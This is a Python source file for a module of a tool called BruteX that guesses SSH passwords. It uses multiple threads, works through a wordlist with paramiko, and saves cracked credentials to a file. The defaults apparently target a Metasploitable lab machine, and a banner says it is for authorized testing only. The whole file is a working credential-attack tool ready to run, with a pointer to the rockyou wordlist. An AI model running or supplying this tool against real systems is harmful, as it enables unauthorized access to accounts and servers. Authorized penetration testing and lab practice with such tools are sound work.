# ssh_brute.py — SSH brute force module for BruteX
# Requires: pip install paramiko

import paramiko
import threading
import socket
import time
from queue  import Queue
from logger import log, log_success

# Suppress paramiko internal noise
import logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

THREAD_COUNT = 5     # Keep low — SSH blocks rapid connections
TIMEOUT      = 5     # seconds per attempt
DELAY        = 0.5   # delay between attempts to avoid lockout

# Shared state
found       = False
found_creds = None
found_lock  = threading.Lock()

def try_ssh(host, port, username, password, results):
    """
    Try a single SSH login attempt.
    Returns True if successful.
    """
    global found, found_creds

    if found:
        return

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname       = host,
            port           = port,
            username       = username,
            password       = password,
            timeout        = TIMEOUT,
            banner_timeout = TIMEOUT,
            auth_timeout   = TIMEOUT,
            allow_agent    = False,
            look_for_keys  = False
        )

        # SUCCESS!
        with found_lock:
            found       = True
            found_creds = (username, password)

        log(f"Trying {username}:{password} → SUCCESS!", "SUCCESS")
        log_success(host, port, "SSH", username, password)
        results.append((username, password))
        client.close()

    except paramiko.AuthenticationException:
        log(f"Trying {username}:{password} → FAILED", "FAIL")

    except Exception:
        # Suppress all connection noise silently
        log(f"Trying {username}:{password} → FAILED", "FAIL")

    finally:
        try:
            client.close()
        except:
            pass

    time.sleep(DELAY)


def worker(host, port, username, queue, results):
    """Thread worker — pulls passwords from queue."""
    while not queue.empty() and not found:
        password = queue.get()
        try_ssh(host, port, username, password, results)
        queue.task_done()


def ssh_brute(host, port, username, passwords):
    """
    Main SSH brute force function.
    Returns (username, password) tuple if found, None otherwise.
    """
    global found, found_creds
    found       = False
    found_creds = None

    queue   = Queue()
    results = []
    threads = []

    log(f"Starting SSH brute force on {host}:{port}", "INFO")
    log(f"Target user : {username}", "INFO")
    log(f"Passwords   : {len(passwords)}", "INFO")
    log(f"Threads     : {THREAD_COUNT}", "INFO")
    log(f"Delay       : {DELAY}s between attempts\n", "INFO")

    # Load all passwords into queue
    for p in passwords:
        queue.put(p)

    # Spawn worker threads
    for _ in range(min(THREAD_COUNT, len(passwords))):
        t = threading.Thread(
            target = worker,
            args   = (host, port, username, queue, results)
        )
        t.daemon = True
        t.start()
        threads.append(t)

    # Wait for all threads to finish
    for t in threads:
        t.join()

    if results:
        return results[0]
    return None


if __name__ == "__main__":
    import sys
    from wordlist_gen import get_wordlist

    host     = sys.argv[1] if len(sys.argv) > 1 else "192.168.56.200"
    port     = int(sys.argv[2]) if len(sys.argv) > 2 else 22
    username = sys.argv[3] if len(sys.argv) > 3 else "msfadmin"
    wordlist = sys.argv[4] if len(sys.argv) > 4 else None

    print("""
  ╔══════════════════════════════════════╗
  ║       BRUTEX — SSH MODULE            ║
  ║   [!] Authorized testing only        ║
  ╚══════════════════════════════════════╝
    """)

    passwords = get_wordlist(wordlist, username)
    result    = ssh_brute(host, port, username, passwords)

    print()
    if result:
        print(f"  [✓] CRACKED → {username}:{result[1]}")
        print(f"  [✓] Saved   → cracked_credentials.txt")
    else:
        print(f"  [✗] Password not found for {username}")
        print(f"  [*] Try a larger wordlist:")
        print(f"      python ssh_brute.py {host} {port} {username} /usr/share/wordlists/rockyou.txt")